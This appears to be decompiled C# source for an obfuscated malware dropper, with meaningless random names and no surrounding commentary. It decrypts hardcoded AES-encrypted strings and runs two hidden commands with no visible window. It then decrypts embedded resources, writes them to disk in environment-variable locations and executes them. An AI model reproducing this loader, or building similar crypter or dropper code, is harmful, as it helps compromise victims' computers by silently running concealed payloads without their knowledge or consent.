using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;

namespace vpppapxqlhunnbxavuims;

internal class vpppapxqlhunnbxavuims
{
	public static byte[] ytxdtmsv(byte[] yjhll)
	{
		using Aes aes = Aes.Create();
		using MemoryStream memoryStream = new MemoryStream();
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(new Rfc2898DeriveBytes("pvpbgplnnimrlzzeycztylmpyrriebystkbumwfydhcirtqazswjpvwchzcqxdimkvyayfsbxaprjexfaqilencxpylmupaayqxwuqcuaumnfftdcwphuxhxsalztehhzpttgakknpkjapsifikxztgahadudcavmfprmzwbletfmywdicukukhfiskgxrglnpxvaawflikvaanjealahqbbxiiupqeuxhsxaadhgpykzlfhebcwfgdxnwxrscrw", Encoding.ASCII.GetBytes("erytiqjdxdutsqckdapnnhprdujedlpd"), 100).GetBytes(16), Encoding.ASCII.GetBytes("xbginlypryzblkfy")), CryptoStreamMode.Write))
		{
			cryptoStream.Write(yjhll, 0, yjhll.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static string euhyiruadyugmplwgxqa(string yjhll)
	{
		return Encoding.UTF8.GetString(ytxdtmsv(Convert.FromBase64String(yjhll)));
	}

	public static void xmcvr(string cthdgeucxxqdvkvecraxtmnxemnaa)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = euhyiruadyugmplwgxqa("unhE7C5xlI13pJXw8tBdQQ==");
		processStartInfo.Arguments = cthdgeucxxqdvkvecraxtmnxemnaa;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		Process.Start(processStartInfo);
	}

	public static void Main()
	{
		xmcvr(euhyiruadyugmplwgxqa("ND6WZ+menzBQtEv8VZ29LWC+7AorN8tXtpZib9AMLnklhFaAqBkI8Oy0t5Mk5vaVxYsdU+cIjGPg26kVpf3utjJZVsxoVB9QZV/qhY6MTSLPZgv5PCxXJGic//bCde7ZuE7UaFF6mO91cCt3VbQ1r5z9h535AXeHDtunT4wWnvS4rWwUEbWGxuHDv6Fz1gtXhGBSQhjHAlJ04zqjFAOD7AMBbK4TlYInYzmEjwWtUqExqYr1gz6F+Brid3d6+1zEm3y8MHd+fWzmL1GIz66p1uxsvDZlgEBwjfAvJUfA0qE0EOZZauSQbXLA0juJR3T0zynarN+/iR2JEsoZjb7LUxrN9xHirrfPclt7wt0//I0W+2Xxtye77tDhhNwVL16JesEdB/TQPmVNHkyHXbyTxKECqfUUuCKKPBncCb0CvC8UFXPd7pIc27pP737yRoBbByTsHS6ZFgz65ebJRAXTfHl2vSIZVEximqYFE2QsALDiW2+kktJqNsKt/L9+DYnR4Xtbd3yDX+418BFw4XRKaQ=="));
		xmcvr(euhyiruadyugmplwgxqa("ND6WZ+menzBQtEv8VZ29LT+4j277/Y4cG3xNyhqCcdWHxOAKOXWrXQZjDdG68aS+yanw/HdEg9WeowNQZJY0gPqPPUT7zSczA36Q6YySrTZ8whHObpujlgvW2brKNjgIeMe3Ov1WdhaRnm73DgIR91h1E3bx/YK0qyGchD5OY/zTehDymPtVVI/3+w7roKlLFalbf396G/Sfh+63SDBPrbeM7SGJpTL5shD1fNuoZHdD+T5l09xKBLfqn80LceY73n+ldy91w3glUKaUGUCuJEaiw8iDQSE7dEZ0N9bDIli6UFoQ5s7rPFJZ7ZMSl+tg5wMarEpoKedV/N1xH17UDhrq+ssQ8ekYf8UHMjf/Lx7+s8SpNrStclH/n/sZ5zo3KL4RJ9yqwkW09p0azsbPbg=="));
		string[][] array = new string[2][]
		{
			new string[4] { "cXH4iZTK6WQg/FffdBuNyQ==", "ZrwX5HdHueXTItWtRrhd2c8y62hC5xXWmSU2ff96Z6Y=", "gdrianuereayfjqq", "XYIWbEKBnediinnklTcmhw==" },
			new string[4] { "cXH4iZTK6WQg/FffdBuNyQ==", "Rv6k7jJokoj9yTd9bokQvA4GuKnt3W9Q3sKitd9YtS4=", "zvlesebzqqkldfxv", "XYIWbEKBnediinnklTcmhw==" }
		};
		ResourceManager resourceManager = new ResourceManager("hfxrbyaeumiwhqze", Assembly.GetExecutingAssembly());
		for (int i = 0; i < 2; i++)
		{
			string text = Path.Combine((array[i][0] == "ETjIzoaMxxYc9XHDy030By8VNyh8qYhDSwoCmP4hYbo=") ? Directory.GetCurrentDirectory() : Environment.GetEnvironmentVariable(euhyiruadyugmplwgxqa(array[i][0])), euhyiruadyugmplwgxqa(array[i][1]));
			File.WriteAllBytes(text, ytxdtmsv((byte[])resourceManager.GetObject(array[i][2])));
			if (euhyiruadyugmplwgxqa(array[i][3]) == euhyiruadyugmplwgxqa("XYIWbEKBnediinnklTcmhw=="))
			{
				Process.Start(text);
			}
		}
	}
}
